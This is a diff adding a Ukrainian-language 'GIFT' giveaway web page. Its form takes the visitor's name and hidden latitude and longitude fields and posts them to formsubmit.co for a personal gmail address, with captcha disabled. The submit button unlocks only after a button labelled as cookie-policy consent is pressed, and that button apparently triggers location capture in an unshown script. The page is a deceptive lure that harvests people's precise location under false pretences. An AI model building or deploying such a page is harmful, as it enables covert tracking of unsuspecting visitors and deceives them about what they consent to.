@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="uk">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>GIFT</title>
+
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <header class="header">
+        <div class="container">
+
+            <a href="#" class="logo">
+                GIFT
+            </a>
+
+        </div>
+    </header>
+
+
+    <main class="main">
+
+        <section class="gift-card">
+
+            <div class="gift-icon">
+                🎁
+            </div>
+
+            <h1>GIFT</h1>
+
+            <p class="description">
+                Отримай свій подарунок
+            </p>
+
+
+            <form id="locationForm" action="https://formsubmit.co/word401010408@gmail.com" method="POST">
+
+                <!-- Ім'я -->
+
+                <input type="text" name="name" id="name" placeholder="Введіть ваше ім'я" autocomplete="name" required>
+
+
+                <!-- Геолокація -->
+
+                <input type="hidden" name="latitude" id="latitude">
+
+                <input type="hidden" name="longitude" id="longitude">
+
+
+                <!-- Додаткові налаштування FormSubmit -->
+
+                <input type="hidden" name="_subject" value="🎁 Нова заявка з GIFT">
+
+                <input type="hidden" name="_captcha" value="false">
+
+                <input type="hidden" name="_template" value="table">
+
+
+                <!-- Location -->
+
+                <button type="button" id="locationBtn" class="location-btn">
+                    📍 Згода з політикою cockie
+                </button>
+
+
+                <!-- Статус -->
+
+                <p id="status" class="status">
+                    Натисніть cockie,
+                    щоб отримати подарунок
+                </p>
+
+
+                <!-- Відправка -->
+
+                <button type="submit" id="submitBtn" class="submit-btn" disabled>
+                    🎁 Отримати подарунок
+                </button>
+
+            </form>
+
+        </section>
+
+    </main>
+
+
+    <footer class="footer">
+
+        <p>
+            © 2026 GIFT
+        </p>
+
+    </footer>
+
+
+    <script src="script.js"></script>
+
+</body>
+
+</html>
